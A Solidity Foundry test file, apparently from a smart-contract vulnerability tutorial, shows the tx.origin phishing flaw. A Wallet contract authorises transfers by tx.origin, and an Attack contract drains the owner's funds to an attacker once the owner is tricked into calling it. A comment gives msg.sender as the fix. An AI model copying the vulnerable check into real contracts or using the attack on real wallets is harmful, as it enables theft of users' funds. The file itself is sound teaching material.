// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

/*
Name: Insecure tx.origin Vulnerability

Description:
tx.origin is a global variable in Solidity; using this variable for authentication in 
a smart contract makes the contract vulnerable to phishing attacks.

Scenario:
Wallet is a simple contract where only the owner should be able to transfer
Ether to another address. Wallet.transfer() uses tx.origin to check that the
caller is the owner. Let's see how we can hack this contract

What happened?
Alice was tricked into calling Attack.attack(). Inside Attack.attack(), it
requested a transfer of all funds in Alice's wallet to Eve's address.
Since tx.origin in Wallet.transfer() is equal to Alice's address,
it authorized the transfer. The wallet transferred all Ether to Eve.

Mitigation:
It is advisable to use msg.sender.

REF:
https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing
*/

contract ContractTest is Test {
    Wallet WalletContract;
    Attack AttackerContract;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        WalletContract = new Wallet{value: 10 ether}(); //Alice deploys Wallet with 10 Ether
        console.log("Owner of wallet contract", WalletContract.owner());
        vm.prank(eve);
        AttackerContract = new Attack(WalletContract); //Eve deploys Attack with the address of Alice's Wallet contract.
        console.log("Owner of attack contract", AttackerContract.owner());
        console.log("Eve of balance", address(eve).balance);

        vm.prank(alice, alice);
        AttackerContract.attack(); // Eve tricks Alice to call AttackerContract.attack()
        console.log("tx origin address", tx.origin);
        console.log("msg.sender address", msg.sender);
        console.log("Eve of balance", address(eve).balance);
    }

    receive() external payable {}
}

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        // check with msg.sender instead of tx.origin
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
